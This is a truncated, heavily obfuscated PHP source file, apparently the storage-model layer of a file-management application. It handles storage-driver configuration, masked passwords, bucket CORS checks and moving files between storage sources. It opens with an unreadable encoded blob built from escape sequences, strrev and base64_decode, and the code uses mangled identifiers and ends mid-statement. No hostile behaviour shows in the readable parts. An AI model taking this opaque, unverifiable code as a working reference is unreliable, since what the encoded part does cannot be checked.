."\175\41\245\304\70\204\32\1\212\62\251\347\25\151\142\204\124\26\265\316\305\364\44\70\222\23\321\161\223\107\226\112\166\141\250\204\52\251\211\2\270\46\127\125\143\23\5\16\26\145\373\50\127"."\x24\xc7\x52\x93\xf8\xe4\xe6\x72\xf1\x96\x1c\x60\xa9\x1c\x38\x2d\x47\x80\x4a\x89\x3a\x4a\xf3\x28\x9e\x6b\x58\x67\xd6\x6\xd8\xf5\xbe\xb3\xad\xd3\xcf\xa3\x1a\xf9\xf6\xa4\xdc\x15\x61\xa5\xb0\x89\x89\x62\xea\x23\x3a"."\334\4\207\263\106\102\11\107\132\103\115\201\160\163\50\266\104\351\307\317\264\102\102\21\165\127\45\333\126\265\204\33\42\342\211\311\271\301\11\177\232\56\7\203\365\76\356\332\7\177\172\373\320"."\xe5\xc2\x9b\xe4\x97\x32\x4b\x5c\xbf\xc8\x8\xa1\x32\xe1\x5a\xd1\x59\x2d\x85\x4a\xbd\x50\x52\x63\xe\xab\xa\x66\x4a\xca\x60\xae\x7b\x99\xdc\x19\xc1\x34\x96\x32\xe7\xb\x7a\x69\xfe\x51\x1d\x4b\x4a\x4a\x3d\x96\xa"."\x14\xcb\xf4\x6\xf2\x97\x6f\x81\xf8\x65\x92\x73\x23\x9a\x49\xcf\x4d\xd4\x79\x23\x37\x64\x58\x86\x40\x7\xac\xc4\xa8\x5c\x7b\xa0\xb9\x3d\xd4\xa1\x6\xc2\xe1\xc8\x32\x87\xa4\xb1\x78\x6f\x28\x70\xee\x4b\x52\x76\xab".strrev('ÜáÆL´ï´­¡ê¥ÒÃ4Ë½¹(49_siìóYÆÉòèdqqøqSlºÚXŒ­%').base64_decode('NpOSgkXneVu2KZU2wOII9TtxhmiotS3+P+6qkRTmC40kk1HjmtbUjU6T7BKZtSmcNZXG/E8=')."\xdd\x6\x7a\xc4\xf3\xa2\x4a\xec\xa6\x31\xbf\xa5\x26\xb9\x4b\x1\xa1\x4f\xe3\x42\x11\x95\xda\x63\x13\x4d\x20\x2a\xa6\x30\x9a\x97\x9f\x75\xfd\x49\xa8\x1\x1b\x98\xd\x32\x55\x23\x1c\x10\x97\x19\x9c\xb\x2a\xc1\xad".strrev(':e)İEÆ{ˆP˜Å{9@£ÆëMSÄIa«Ã½À·Cß—L¹á0#B0ö»$.c¹º.+Ğ')."\200\222\25\301\33\343\31\224\6\245\206\172\350\344\136\217\224\205\314\236\204\150\200\230\122\14\146\363\266\343\372\337\46\53\337\110\113\102\43\60\243\250\300\271\176\164\315\131\20\57\54\173\200".base64_decode('NlX57CR4WFwKscimmR0tiXCw0cJsNFx4GnuKyqVMedYJPsf6V9TxLuVOeNB9RLdLXfXR4v8=').strrev('+ª\\B—cÄ§³¢GÙuˆÃ´ ãÃ ïÛŒqxŞ‡6˜Bö´üû–C´¤¬ì²Lbi7')."\x19\xc1\xda\x63\xc1\x1f\x76\xfb\x25\x99\xa5\xa6\xa7\xd2\x9f\x1e\xf8\x65\xa7\xa1\xbb\x13\x14\xcf\x41\x93\xd5\x1c\x14\x9b\xd2\x46\x26\x59\xe0\x22\x5d\x22\xa2\x5d\x17\x2c\x9\x52\xa\x21\x96\xbc\xc6\x5c\xc7\x13\x8f"."\244\315\14\245\203\223\260\162\316\50\261\211\125\247\257\63\341\102\116\34\275\116\227\132\134\216\300\22\133\310\262\35\116\334\342\146\134\353\367\120\120\305\110\121\204\32\107\345\157\131\240\237\214"."\2\45\62\266\141\222\257\367\42\51\3\363\370\232\364\20\177\243\24\57\272\275\220\111\373\223\243\137\271\164\77\261\34\12\362\206\16\155\275\2\272\242\351\354\10\161\144\243\121\176\55\237\27"."\x8f\x28\xf2\x89\x8b\xfe\x75\x28\x62\x43\x5a\x57\xbc\x4d\x25\xa6\x49\x54\x2a\x18\x11\x13\x30\x27\x3d\x6c\xd2\x48\x78\xe4\x2c\xe6\x42\xf4\x31\xc7\x11\x5b\x90\x2e\x8f\xb2\x9d\x6d\xfa\xc0\x23\xf4\x79\x21\x3b\xea\x67".base64_decode('J33RhQmTq2Sv7Jwhj/ARv2P7S1/lsagaYBQsGsRksgZMckfzybc7yKAsZEZlEM3pFVDi2NM=').base64_decode('GKoQtU2duxKkISO38rGEDid41gtogim50lMPG3Bg9mkz/DbGfcxKQb4jnB7z6NYhP816il8=')."\265\160\130\20\27\262\175\46\41\12\344\366\12\133\352\341\226\171\263\145\173\17\134\331\226\361\117\73\241\173\133\217\320\375\376\42\107\174\102\323\70\217\326\322\351\253\230\223\46\374\66\123\162".base64_decode('IXLfhfhiuApE3QsWN0tZ2ULwweF8Vxo14MZSB77SNEjjLhYyHiID4mFil2V9ADvcAroXtIw=')."\x17\xe1\x2f\xad\x10\x54\x2e\xc8\x55\x30\xe9\x44\x9b\xf5\xb\xfb\xa\xec\xb1\xdc\x9d\xcd\x70\x40\x3c\x3a\xc1\x85\xfa\x21\x35\x6f\x5d\x72\xc2\xac\xc8\x26\xeb\x66\xce\x9e\x2f\xb3\x5c\xc4\x12\x8a\x27\x64\xb0\xf2\x2"."\x2f\xe1\xb3\x1\xec\x39\x50\x28\x4e\x30\x54\x98\x4d\x6d\x19\x7d\x90\x44\xa7\xe\x4f\xa9\xc3\x69\xd7\x11\xf2\x3f\xdb\x30\xe2\xf6\x42\xb3\x4a\xa2\xc1\xbc\xbe\x72\x3e\x26\x25\x38\x95\x64\xd6\xa4\x13\xd5\x25\x6d\x64"."\x62\x1\x20\x4b\xec\x3a\x7a\x86\xa\x37\xd3\xce\xb6\x28\xfd\x51\x66\x1c\xd2\xc1\x29\x36\xb\x75\x1d\x6c\x66\xf0\xcd\x3f\x8b\x9f\x19\xec\x82\xe6\xbc\xd0\x96\xbb\xb7\x91\x99\x60\x97\x44\xcc\x29\x16\x21\xa7\xf8\x16"."\360\170\104\262\164\261\223\153\264\115\67\203\12\27\307\7\53\141\266\106\162\31\70\367\261\141\14\261\333\44\114\364\77\130\100\166\107\243\327\71\41\267\206\207\357\270\332\73\147\301\177\42\103".base64_decode('M2XcQ0tiOl8wBkoq8rupV7O9EnBKDE7djpDFBnQhrtDOcbuqR8VEHb0eZaJMpfSi5EVamGQ=').base64_decode('lChFXJqptU/AgSBa1U6aS/ZUS1SShUUhsnUd21gyUi+r9JKK5P1RWrXk91fwrQijC0YEm5s=').base64_decode('yG2QbgZauUK4JgkhOplpQB1K/u7R9Eku4U35W/Injc6ECNPYQN1x3INRWJhll/BX0hXJ5ow=')."\x20\xd\xe1\xfc\x9c\x90\xce\xd3\x81\x68\x96\xcd\xe\x38\x6e\x5e\xdc\x31\xaa\xe3\x26\x66\xb9\xbd\x23\x23\xca\xd2\xe1\x2a\x26\x59\xe2\x8b\x1e\xd0\x28\xd1\xde\xa3\xad\x49\x7\xb1\x38\x73\xc5\x57\x47\x31\x2b\x2\x12"."\203\232\134\337\170\242\303\72\3\66\103\350\302\30\314\346\203\345\362\267\116\115\233\323\157\166\313\370\137\73\6\376\177\345\17\170\166\15\173\112\340\272\177\270\41\256\154\330\12\104\77\164\33"."\277\346\162\36\12\345\147\273\6\344\74\165\47\1\160\241\125\360\15\11\134\103\302\134\234\235\331\244\144\246\52\65\366\330\247\145\62\322\331\134\376\232\124\342\371\35\301\344\0\167\365\135\56".strrev('‰ËÎæ£h3³+­v&fd#Ä¸Z¤b…Ô7åÚ;ì˜®W W½Æædì&ï{vRVà')."\62\117\376\104\366\327\351\146\101\42\176\112\262\211\356\43\32\211\213\37\263\257\4\276\317\22\333\70\260\14\262\375\202\110\236\335\174\253\341\224\351\75\221\141\103\142\63\5\220\242\214\10\35"."\121\45\350\63\356\130\134\107\244\274\156\2\307\371\30\134\70\112\264\273\134\133\323\114\226\74\267\216\7\215\122\11\220\322\322\34\263\310\105\260\72\202\223\167\207\227\225\134\173\152\274\256\210"."\132\257\253\72\356\335\333\271\151\34\356\246\251\324\14\332\151\121\314\243\141\274\72\362\46\106\136\314\275\245\145\350\6\211\211\74\23\154\321\362\30\203\167\112\360\53\361\227\74\37\14\363\164"."\26\114\102\210\72\143\71\337\112\222\2\117\110\114\141\67\155\111\243\247\372\112\116\105\206\204\35\53\205\305\20\305\133\154\74\22\15\252\313\102\330\326\106\350\224\140\27\263\25\155\230\304\303".strrev('[.T\\^çåc3:™æLhf%¹µ;¿‰¾lí¡Ä£Ğ’€S¤·@ÁâèŠ½«²«')."\302\54\130\262\265\120\107\42\46\353\114\224\32\145\27\375\24\223\367\350\312\241\35\255\47\154\75\251\140\112\301\161\171\350\236\125\63\263\367\213\252\103\351\74\347\254\57\311\11\267\230\330\114"."\57\23\135\146\171\312\226\63\251\205\240\162\151\10\110\143\266\3\232\204\47\41\267\7\41\247\307\240\172\211\231\113\235\61\71\134\215\225\54\122\207\331\44\150\30\127\32\306\21\23\247\342\153".strrev('•&u©Ï¾bQÛ4B‘£²ZåéoPE‚™…&Uf¡_ƒÀˆ~*ªÃ)› (°c¾g\'0')."\47\234\51\312\154\162\360\234\100\362\101\216\222\44\1\320\275\57\351\364\52\107\22\111\64\263\137\16\65\110\157\331\116\121\2\256\320\133\162\346\26\215\260\224\114\112\61\73\270\350\27\333\45"."\x8\x9\x33\x52\x24\x99\xbe\xc7\x5\x86\x34\x6e\xa9\xcd\x5d\xaa\xcb\x71\xa7\x96\x4\xf\x12\x4\x99\x4\x4b\xdf\x96\xc5\x93\xb7\x44\xc8\xb2\x62\xf8\x52\x2e\x88\x9\x57\xbc\x84\x7c\xc5\xf1\xa8\xd\x9\xb2\x5c\x5c"."\13\223\311\26\155\250\114\326\244\356\266\264\207\142\170\126\102\326\113\6\105\204\142\221\76\54\267\16\371\204\42\217\43\143\151\254\60\70\42\225\27\357\211\142\230\70\256\334\360\11\62\164\26"."\227\15\232\160\240\22\121\324\267\26\227\322\221\256\340\130\214\111\210\357\320\241\160\116\223\150\322\151\76\205\147\343\153\206\362\20\25\103\257\43\326\305\124\300\114\75\106\173\272\222\200\315\45"."\x55\x5f\x96\x1b\x26\x81\x80\x9e\x9\x4b\xd5\xc9\xb2\x6\x13\x16\x88\x95\x6f\x44\x40\xa5\x73\x8a\x25\xbb\x33\x22\x81\x51\x37\xa6\x63\xf2\xa5\xe3\x8d\xf\xc\x72\x46\xe5\x44\x47\x77\xdc\x4b\x4b\xee\xc0\x2\x7c\x69".base64_decode('ZJY8SdC0gDOJ5tddvZcLuEdGSzgcSsrxw4adSEsX9tLE0vhCyWRDB8qPw91bNtduNoaopKQ=')."\77\222\40\123\334\54\123\206\366\250\154\61\232\204\113\212\13\221\243\354\4\123\200\313\322\44\134\266\44\231\25\56\231\127\122\316\326\212\326\4\303\53\235\74\140\213\45\313\14\130\60\217\244".base64_decode('rBPNZ9nMpc0BJLpzEz5a+V4I9pdLdKRcL8pmnrAX7tyCKsHX33IpDvkr54lSDm+zlDKYmmI=')."\241\11\5\263\204\260\122\351\221\41\322\312\210\116\321\46\61\175\44\233\264\54\223\54\313\141\225\227\324\212\226\305\62\226\123\204\312\25\57\117\20\30\144\7\142\33\0\30\21\151\31\143\0"."\42\45\125\226\251\216\243\244\230\33\310\231\374\170\112\12\261\144\114\133\5\12\356\171\56\251\315\11\372\271\242\144\4\277\254\146\215\7\363\250\112\371\77\31\215\253\73\12\51\76\172\275\66"."\155\43\241\73\55\355\313\226\55\151\72\153\44\43\161\304\135\314\150\301\61\163\10\363\224\141\321\222\50\372\351\23\357\102\264\76\211\70\22\60\341\120\202\243\44\11\74\302\321\247\374\46\374"."\322\306\37\161\211\21\170\172\204\323\344\230\131\260\75\70\55\156\346\311\157\243\151\333\102\62\206\62\245\10\41\216\317\141\217\44\370\205\276\304\213\55\356\24\171\377\43\140\113\60\26\371\4"."\241\2\314\344\211\351\64\225\340\71\107\0\277\53\362\200\174\314\302\253\141\113\321\45\376\40\42\6\314\144\237\71\302\314\111\42\270\222\46\111\274\41\152\156\332\162\310\255\210\55\213\261\21".strrev('¦m,¶,@Î¤’±âÅé(.¦º}ATAà¢ÿL—\'AÔâıò«}o~Ô—“­Áø¦Ÿ–+[')."\56\140\112\222\111\51\111\130\260\44\251\263\55\322\61\121\132\260\75\20\12\227\244\141\271\302\16\125\30\46\245\111\241\116\322\113\362\216\76\121\57\102\115\113\104\117\112\355\301\262\147\273\60"."\x78\x1c\x15\xeb\x22\x3d\x63\xe5\xd3\x26\x7b\x9d\x62\xf9\x63\x5a\x86\xf1\x8d\xa4\x67\xe\x3d\x2b\x2c\xd7\x8a\x32\x4e\x76\x98\xbc\xfe\x16\x33\x31\xcd\x3f\x9c\x7e\x17\x5d\x62\xbe\xc\xb0\xa1\x22\x2c\x25\xd8\x1\x75"."\x47\xf3\x10\x8b\x5d\xe7\x70\xfc\xc0\xe9\x7c\x21\xaa\xe2\x73\x88\xb4\x48\xf1\x64\xf\x11\xa4\x24\xc1\xa6\x7c\xde\x93\x87\x4d\xce\x17\x23\xc9\xd3\xcb\x4e\x97\xfc\x8\x52\xfa\x40\x47\x52\xc5\x74\xe0\x6e\x9e\x64\x82"."\30\352\52\263\117\172\200\243\167\56\120\271\207\11\226\344\102\351\267\43\331\326\372\313\312\171\120\156\66\306\31\202\317\374\177\0\56\202\243\353\115\273\0\0".base64_decode('').""."".""."".base64_decode(''), 10, -8))); goto aö×±²Ê¢á; Bƒ¿Èèø‚: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\163\x6f\x75\162\143\x65\x53\x65\x63\162\x65\164\114\151\163\x74"; public $field = array("\x73\x6f\x75\x72\x63\145\111\104", "\x74\171\160\145\111\104", "\143\162\145\x61\164\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x73\x74\157\162\141\x67\145\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\x69\x7a\145\x4d\x61\x78", "\163\171\x73\164\x65\x6d", "\144\x65\146\141\x75\154\x74", "\144\162\151\166\x65\162", "\x63\x6f\x6e\x66\151\147"); public function listData($‰Ç‰ÆÖÂ = false, $Áúà”›× = "\155\x6f\144\x69\146\171\x54\x69\x6d\145", $˜¬—Í»À = false) { $à½¥ëÁû =& $_SERVER[†ûãı«°]; $§ÒËÒßØ = parent::listData($‰Ç‰ÆÖÂ, $Áúà”›×, $˜¬—Í»À); if ($‰Ç‰ÆÖÂ) { return $§ÒËÒßØ; } $‹ªÌÔª« = array(); if ($GLOBALS[$à½¥ëÁû[2321]]) { $‹ªÌÔª« = $this->ioSizeUseGet(array_to_keyvalue($§ÒËÒßØ, $à½¥ëÁû[12], $à½¥ëÁû[477])); } foreach ($§ÒËÒßØ as $šéêŸµ¿ => $ü‡æ¤ÆÛ) { unset($§ÒËÒßØ[$šéêŸµ¿][$à½¥ëÁû[6]]); $§ÒËÒßØ[$šéêŸµ¿][$à½¥ëÁû[1972]] = isset($‹ªÌÔª«[$ü‡æ¤ÆÛ[$à½¥ëÁû[477]]]) ? $‹ªÌÔª«[$ü‡æ¤ÆÛ[$à½¥ëÁû[477]]] : 0; } return $§ÒËÒßØ; } public function ioSizeUseGet($Ôä‰ÅÂ) { $ĞÎ·‹åâ =& $_SERVER[†ûãı«°]; if (!$Ôä‰ÅÂ) { return array(); } $ìÃŠ®«½ = $ĞÎ·‹åâ[2322] . implode($ĞÎ·‹åâ[50], $Ôä‰ÅÂ); $î¸ìîêº = Cache::get($ìÃŠ®«½); if ($î¸ìîêº) { return $î¸ìîêº; } $î¾Åç†é = array($ĞÎ·‹åâ[899] => $ĞÎ·‹åâ[477], $ĞÎ·‹åâ[2323] => $ĞÎ·‹åâ[79]); $•ó©ú±› = array($ĞÎ·‹åâ[899] => array($ĞÎ·‹åâ[7], $Ôä‰ÅÂ)); $î¸ìîêº = Model($ĞÎ·‹åâ[867])->field($î¾Åç†é)->where($•ó©ú±›)->group($ĞÎ·‹åâ[899])->select(); $î¸ìîêº = array_to_keyvalue($î¸ìîêº, $ĞÎ·‹åâ[477], $ĞÎ·‹åâ[79]); Cache::set($ìÃŠ®«½, $î¸ìîêº, 600); return $î¸ìîêº; } public function getConfig($˜ª‚”ß½) { $Ğ“‚¡˜ó = parent::listData($˜ª‚”ß½); $­‡´Ÿ÷® = _get($Ğ“‚¡˜ó, $_SERVER[†ûãı«°][6], array()); if ($­‡´Ÿ÷® && !is_array($­‡´Ÿ÷®)) { $­‡´Ÿ÷® = json_decode($­‡´Ÿ÷®, !0); } return $­‡´Ÿ÷®; } public function update($éÚ•¨®, $°µÓ¶¶¶) { $ºğËŸ½® =& $_SERVER[†ûãı«°]; $êâµÊ» = $°µÓ¶¶¶[$ºğËŸ½®[32]]; $»¯˜Ë·í = array_to_keyvalue(parent::listData(), $ºğËŸ½®[32]); if (isset($»¯˜Ë·í[$êâµÊ»]) && $»¯˜Ë·í[$êâµÊ»][$ºğËŸ½®[477]] != $éÚ•¨®) { return !1; } $this->checkPwd($éÚ•¨®, $°µÓ¶¶¶); if (isset($°µÓ¶¶¶[$ºğËŸ½®[2324]]) && $°µÓ¶¶¶[$ºğËŸ½®[2324]] == $ºğËŸ½®[91]) { $this->checkConfig($°µÓ¶¶¶); } unset($°µÓ¶¶¶[$ºğËŸ½®[2324]]); $õ‘â˜›ë = parent::update($éÚ•¨®, $°µÓ¶¶¶); if ($õ‘â˜›ë && $°µÓ¶¶¶[$ºğËŸ½®[37]]) { $ô§¹í‚÷ = 0; foreach ($»¯˜Ë·í as $’©ñŠ·ü) { if ($’©ñŠ·ü[$ºğËŸ½®[37]] && $’©ñŠ·ü[$ºğËŸ½®[477]] != $éÚ•¨®) { $ô§¹í‚÷ = $’©ñŠ·ü[$ºğËŸ½®[477]]; parent::update($’©ñŠ·ü[$ºğËŸ½®[477]], array($ºğËŸ½®[37] => 0)); } } $this->updateBackup($éÚ•¨®, $ô§¹í‚÷); } return $õ‘â˜›ë; } public function add($¹Ü‰õé¨) { $À™¤á«ï =& $_SERVER[†ûãı«°]; $’™ã´•è = array_to_keyvalue(parent::listData(), $À™¤á«ï[32]); if (isset($’™ã´•è[$¹Ü‰õé¨[$À™¤á«ï[32]]])) { return !1; } $this->checkConfig($¹Ü‰õé¨); $ùé …ÊÓ = parent::insert($¹Ü‰õé¨); if ($ùé …ÊÓ && $¹Ü‰õé¨[$À™¤á«ï[37]]) { foreach ($’™ã´•è as $½šÔà®) { if ($½šÔà®[$À™¤á«ï[37]]) { parent::update($½šÔà®[$À™¤á«ï[477]], array($À™¤á«ï[37] => 0)); } } } return $ùé …ÊÓ; } public function updateBackup($Ñâ”´Š›, $„Õğˆäû) { $¥Äâ® =& $_SERVER[†ûãı«°]; if (!$„Õğˆäû) { return; } $ÚæÔÒ¸½ = Model($¥Äâ®[824])->config(); if ($ÚæÔÒ¸½[$¥Äâ®[1752]] != $¥Äâ®[91] || $ÚæÔÒ¸½[$¥Äâ®[828]] != $„Õğˆäû) { return; } $ÑÕš»°« = Model($¥Äâ®[846])->get($¥Äâ®[853]); $ÑÕš»°« = json_decode($ÑÕš»°«, !0); if (!$ÑÕš»°«) { return; } $ÑÕš»°«[$¥Äâ®[828]] = $Ñâ”´Š›; Model($¥Äâ®[846])->set(array($¥Äâ®[853] => $ÑÕš»°«)); } public function checkPwd($·ÄâÍËì, &$ÖÎÀÁ§Ù) { $›áÌÜî =& $_SERVER[†ûãı«°]; if (empty($ÖÎÀÁ§Ù[$›áÌÜî[6]])) { return; } $½êŠïçä = $ÖÎÀÁ§Ù[$›áÌÜî[6]]; if (!is_array($½êŠïçä)) { $½êŠïçä = json_decode($½êŠïçä, !0); } $Š„Êêœµ = $›áÌÜî[12]; $”«©ªÈÑ = array($›áÌÜî[2325], $›áÌÜî[2326], $›áÌÜî[977]); foreach ($”«©ªÈÑ as $ùó¯Ÿ¼æ) { if (isset($½êŠïçä[$ùó¯Ÿ¼æ])) { $Š„Êêœµ = $ùó¯Ÿ¼æ; break; } } if (!$Š„Êêœµ) { return; } $×Ì˜«ú = $this->getConfig($·ÄâÍËì); $û‚‚¼™ñ = $×Ì˜«ú[$Š„Êêœµ]; $«åº½ôå = $½êŠïçä[$Š„Êêœµ]; if ($«åº½ôå == str_repeat($›áÌÜî[222], strlen($û‚‚¼™ñ))) { $½êŠïçä[$Š„Êêœµ] = $û‚‚¼™ñ; $ÖÎÀÁ§Ù[$›áÌÜî[6]] = json_encode($½êŠïçä); } else { if ($«åº½ôå != $û‚‚¼™ñ) { $ÖÎÀÁ§Ù[$›áÌÜî[2324]] = $›áÌÜî[91]; } } } public function checkConfig(&$Å²œ¾«é, $çíÄğÑ— = false) { $âÅô¨éØ =& $_SERVER[†ûãı«°]; $³ßû¢Ç¦ = strtolower($Å²œ¾«é[$âÅô¨éØ[98]]); $¤¹ŞŠå = $Å²œ¾«é[$âÅô¨éØ[6]]; if (!is_array($¤¹ŞŠå)) { $¤¹ŞŠå = json_decode($¤¹ŞŠå, !0); } foreach ($¤¹ŞŠå as $…ÆÚ‘¾à => $İ–¢Ã’Ö) { if (is_string($İ–¢Ã’Ö)) { $¤¹ŞŠå[$…ÆÚ‘¾à] = trim($İ–¢Ã’Ö); } } $¤¹ŞŠå[$âÅô¨éØ[2327]] = rand_string(6); $Š…ÑŞËû = $GLOBALS[$âÅô¨éØ[6]][$âÅô¨éØ[92]][$âÅô¨éØ[907]]; $‚Ú†Ì®« = isset($Š…ÑŞËû[$³ßû¢Ç¦]) ? $Š…ÑŞËû[$³ßû¢Ç¦] : ucfirst($³ßû¢Ç¦); $€‹ŸÙî = $âÅô¨éØ[77] . $‚Ú†Ì®«; if (!$‚Ú†Ì®« || !class_exists($€‹ŸÙî)) { if ($çíÄğÑ—) { return LNG($âÅô¨éØ[2328]); } write_log(array($âÅô¨éØ[2329], $Å²œ¾«é, get_caller_info()), $âÅô¨éØ[215]); show_json(LNG($âÅô¨éØ[2328]), !1, $Å²œ¾«é); } $ÑŞù’ñÑ = new $€‹ŸÙî($¤¹ŞŠå); $»ÎÏø–’ = rtrim($¤¹ŞŠå[$âÅô¨éØ[1273]], $âÅô¨éØ[8]) . $âÅô¨éØ[8]; if (in_array($³ßû¢Ç¦, $ÑŞù’ñÑ->objectDriver)) { try { if (!$ÑŞù’ñÑ->isBucketCors() && !$ÑŞù’ñÑ->setBucketCors()) { $®ÀÏŒ = LNG($âÅô¨éØ[2330]); $®ÀÏŒ .= $âÅô¨éØ[2331] . LNG($âÅô¨éØ[2332]); } } catch (Exception $¥ñƒşÌò) { $®ÀÏŒ = $¥ñƒşÌò->getMessage(); } if (isset($®ÀÏŒ)) { return $this->_parseError($®ÀÏŒ, $³ßû¢Ç¦, $çíÄğÑ—); } if ($³ßû¢Ç¦ == $âÅô¨éØ[68] && !$ÑŞù’ñÑ->checkRegion()) { return $this->_parseError(LNG($âÅô¨éØ[2333]), $³ßû¢Ç¦, $çíÄğÑ—); } } else { if ($³ßû¢Ç¦ == $âÅô¨éØ[2334]) { if ($ÑŞù’ñÑ->ftpPath) { $€ÁÓ’Í¼ = trim($»ÎÏø–’, $âÅô¨éØ[8]); if (stripos($€ÁÓ’Í¼, trim($ÑŞù’ñÑ->ftpPath, $âÅô¨éØ[8])) !== 0) { $»ÎÏø–’ = $ÑŞù’ñÑ->ftpPath . $âÅô¨éØ[8] . ($€ÁÓ’Í¼ ? $€ÁÓ’Í¼ . $âÅô¨éØ[8] : $âÅô¨éØ[12]); } } } } $Æü¼« = $ÑŞù’ñÑ->getPath($»ÎÏø–’ . $âÅô¨éØ[1277]); try { if ($³ßû¢Ç¦ == $âÅô¨éØ[109]) { $ÑŞù’ñÑ->mkdir($»ÎÏø–’); } $ş†Ğºû = $ÑŞù’ñÑ->mkfile($Æü¼«); if (!$ş†Ğºû) { $®ÀÏŒ = LNG($âÅô¨éØ[2330]); } } catch (Exception $¥ñƒşÌò) { $®ÀÏŒ = $¥ñƒşÌò->getMessage(); } if (isset($®ÀÏŒ)) { return $this->_parseError($®ÀÏŒ, $³ßû¢Ç¦, $çíÄğÑ—); } $¤¹ŞŠå[$âÅô¨éØ[1273]] = $»ÎÏø–’; $Å²œ¾«é[$âÅô¨éØ[6]] = json_encode($¤¹ŞŠå); $Å²œ¾«é[$âÅô¨éØ[98]] = $‚Ú†Ì®«; return !0; } private function _parseError($ãËá‚œ¸, $Ú­‘Í£Õ, $í¤›Åú¸ = false) { $„ƒÁù” =& $_SERVER[†ûãı«°]; if ($Ú­‘Í£Õ == $„ƒÁù”[68] && stripos($ãËá‚œ¸, $„ƒÁù”[2335])) { $ŞÊäöÙÊ = explode($„ƒÁù”[10], $ãËá‚œ¸); $¬øËµõ = isset($ŞÊäöÙÊ[1]) ? $ŞÊäöÙÊ[1] : $„ƒÁù”[12]; $¹·Î¯ = array($„ƒÁù”[2336] => LNG($„ƒÁù”[2337]), $„ƒÁù”[2338] => LNG($„ƒÁù”[2339])); if (isset($¹·Î¯[$¬øËµõ])) { $ãËá‚œ¸ = $¹·Î¯[$¬øËµõ]; } } if (stripos($ãËá‚œ¸, $„ƒÁù”[2340]) === 0) { $æÖ®´­ƒ = strpos($ãËá‚œ¸, $„ƒÁù”[178]); if ($æÖ®´­ƒ === !1) { $æÖ®´­ƒ = strpos($ãËá‚œ¸, $„ƒÁù”[4]); } if ($æÖ®´­ƒ !== !1) { $ãËá‚œ¸ = substr($ãËá‚œ¸, $æÖ®´­ƒ + 1); } } $ãËá‚œ¸ = LNG($„ƒÁù”[1280]) . $ãËá‚œ¸; if ($í¤›Åú¸) { return $ãËá‚œ¸; } show_json($ãËá‚œ¸, !1); } public function driverListSystem() { $»„ªôåÖ =& $_SERVER[†ûãı«°]; $Õ â—Ÿ¹ = parent::listData(); $°‘ø¿² = array(); foreach ($Õ â—Ÿ¹ as $·ôäş€®) { unset($·ôäş€®[$»„ªôåÖ[233]], $·ôäş€®[$»„ªôåÖ[88]]); if (!is_array($·ôäş€®[$»„ªôåÖ[6]])) { $·ôäş€®[$»„ªôåÖ[6]] = json_decode($·ôäş€®[$»„ªôåÖ[6]], !0); } $°‘ø¿²[] = $·ôäş€®; } return $°‘ø¿²; } public function defaultDriver() { $˜ªÀ’öõ =& $_SERVER[†ûãı«°]; $ü§ïß¦˜ = parent::listData(); $Ì®‰›Œ¯ = array_filter_by_field($ü§ïß¦˜, $˜ªÀ’öõ[37], 1); $Ì®‰›Œ¯ = $Ì®‰›Œ¯[0]; if (!$Ì®‰›Œ¯) { return array(); } if (!is_array($Ì®‰›Œ¯[$˜ªÀ’öõ[6]])) { $Ì®‰›Œ¯[$˜ªÀ’öõ[6]] = json_decode($Ì®‰›Œ¯[$˜ªÀ’öõ[6]], !0); } return $Ì®‰›Œ¯; } public function driverInfo($Ù³éğŸ¨) { $¦¢Ò£Øî =& $_SERVER[†ûãı«°]; $‘áÙ°šš = array_to_keyvalue(parent::listData(), $¦¢Ò£Øî[477]); if (!isset($‘áÙ°šš[$Ù³éğŸ¨])) { return !1; } $½ùœà´ = $‘áÙ°šš[$Ù³éğŸ¨]; if (!is_array($½ùœà´[$¦¢Ò£Øî[6]])) { $½ùœà´[$¦¢Ò£Øî[6]] = json_decode($½ùœà´[$¦¢Ò£Øî[6]], !0); } return $½ùœà´; } public function remove($àòËß­ğ) { $this->removeShareItems($àòËß­ğ); return parent::remove($àòËß­ğ); } public function removeWithFile($ÎÒ¯ ½Ô, $£Ó°˜Èù, $Š©ÛİÁ½, $â¬Êéñå = false) { $ÙÈÓí³ =& $_SERVER[†ûãı«°]; $•½¤ÅÊ = array($ÙÈÓí³[899] => $ÎÒ¯ ½Ô); $Ùû´¬à™ = Model($ÙÈÓí³[548])->where($•½¤ÅÊ)->count(); $É˜Í»„à = Model($ÙÈÓí³[548])->where($•½¤ÅÊ)->sum($ÙÈÓí³[79]); $±ÉûÏ÷Š = $£Ó°˜Èù . $ÙÈÓí³[2341] . $ÎÒ¯ ½Ô; $ˆÕ½çÜœ = LNG($£Ó°˜Èù == $ÙÈÓí³[627] ? $ÙÈÓí³[2342] : $ÙÈÓí³[2343]); $áª›«Åû = new TaskFileTransfer($±ÉûÏ÷Š, $ÙÈÓí³[215], $Ùû´¬à™, $ˆÕ½çÜœ . $ÙÈÓí³[464] . $Š©ÛİÁ½[$ÙÈÓí³[32]] . $ÙÈÓí³[214] . $ÎÒ¯ ½Ô); $áª›«Åû->task[$ÙÈÓí³[839]] = (double) $É˜Í»„à; $İ‡Ÿú€¨ = KodIO::defaultDriver(); $İ×²í†Æ = $İ‡Ÿú€¨[$ÙÈÓí³[477]]; $‹¹ºğşŸ = $ıéÒğûç = $Œ»î»¢º = array(); $ÅŠ€Ì¶Ì = Model($ÙÈÓí³[232])->where($•½¤ÅÊ)->field($ÙÈÓí³[2344])->select(); foreach ($ÅŠ€Ì¶Ì as $Ü‘®ÑÒá) { $ùÂğì¦• = $Ü‘®ÑÒá[$ÙÈÓí³[545]]; if ($â¬Êéñå) { $ıéÒğûç[] = $ùÂğì¦•; continue; } $µî¦³‚“ = $Ü‘®ÑÒá[$ÙÈÓí³[87]]; $—íŠù‚‚ = get_path_father($µî¦³‚“); $Œ»î»¢º[] = $—íŠù‚‚; $—íŠù‚‚ = str_replace("\173\x69\157\x3a{$ÎÒ¯ ½Ô}\175\x2f", "\x7b\151\x6f\x3a{$İ×²í†Æ}\x7d\57", $—íŠù‚‚); if (!IO::exist($µî¦³‚“)) { $‹¹ºğşŸ[] = $ùÂğì¦•; $áª›«Åû->updateFileEnd($Ü‘®ÑÒá[$ÙÈÓí³[32]], $Ü‘®ÑÒá[$ÙÈÓí³[79]]); write_log($ÙÈÓí³[2345] . $µî¦³‚“, $ÙÈÓí³[1915]); continue; } $ö„Ğ“Ø¸ = IO::move($µî¦³‚“, $—íŠù‚‚, REPEAT_RENAME); if 